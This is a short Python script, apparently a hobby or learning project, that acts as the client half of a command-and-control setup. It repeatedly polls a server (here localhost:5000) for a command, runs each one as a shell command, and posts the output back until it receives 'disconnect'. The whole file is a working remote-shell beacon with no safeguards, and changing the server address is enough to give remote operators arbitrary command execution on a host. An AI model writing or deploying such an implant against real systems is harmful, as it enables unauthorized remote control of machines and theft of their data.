import requests
import subprocess
import time

SERVER_URL = "http://127.0.0.1:5000"

commands = {} # keep history of commands executed on this client?

# def log_client():
#     response = requests.get(f"{SERVER_URL}/log-client")
#     if response.status_code == 200:
#         return response.json()['client_id']
#     else:
#         return None

def get_command():
    response = requests.get(f"{SERVER_URL}/get-command") # GET command from server
    if response.status_code == 200: # if request was successful
        cmd = response.json().get('command')
        return cmd
    else:
        return None

def execute_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) # execute shell command in a subprocess
        return result.stdout.decode('utf-8') + result.stderr.decode('utf-8') # decode standard output
    except subprocess.CalledProcessError as e: # umm uhh
        return str(e)

def main():
    try:
        # client_id = log_client()
        while True:
            cmd = get_command()
            if cmd == "disconnect":
                print("disconnected")
                break
            result = execute_command(cmd)
            requests.post(SERVER_URL, json={"result": result})
            print("hi from client")
            time.sleep(10)
    except:
        print("*crickets*")

if __name__ == "__main__":
    main()